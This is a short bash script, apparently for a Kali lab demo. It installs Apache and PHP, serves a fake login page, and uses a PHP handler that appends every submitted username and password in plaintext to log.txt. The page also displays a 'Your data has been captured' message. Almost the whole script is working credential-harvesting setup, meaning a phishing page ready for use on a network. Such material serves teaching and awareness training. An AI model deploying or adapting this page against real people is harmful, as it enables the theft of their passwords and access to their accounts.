#!/bin/bash

# Step 1: Install Apache and PHP
echo "[+] Installing Apache and PHP..."
sudo apt update -y && sudo apt install -y apache2 php

# Step 2: Create insecure login form
echo "[+] Creating login form at /var/www/html/login.html..."
cat << 'EOF' | sudo tee /var/www/html/login.html > /dev/null
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
  <h2>Test Login Page</h2>
  <form action="login.php" method="POST">
    Username: <input name="username"><br>
    Password: <input name="password" type="password"><br>
    <input type="submit" value="Login">
  </form>
</body>
</html>
EOF

# Step 3: Create PHP script to log credentials
echo "[+] Creating credential logger at /var/www/html/login.php..."
cat << 'EOF' | sudo tee /var/www/html/login.php > /dev/null
<?php
file_put_contents("log.txt", $_POST['username'] . ":" . $_POST['password'] . "\n", FILE_APPEND);
echo "<h2>Logged in!</h2><p>Your data has been captured (in a real attack, you wouldn’t see this).</p>";
?>
EOF

# Step 4: Restart Apache service
echo "[+] Restarting Apache2 service..."
sudo systemctl restart apache2

echo "[✓] Setup complete."
echo "Visit http://<KALI-IP>/login.html from another device on the network."
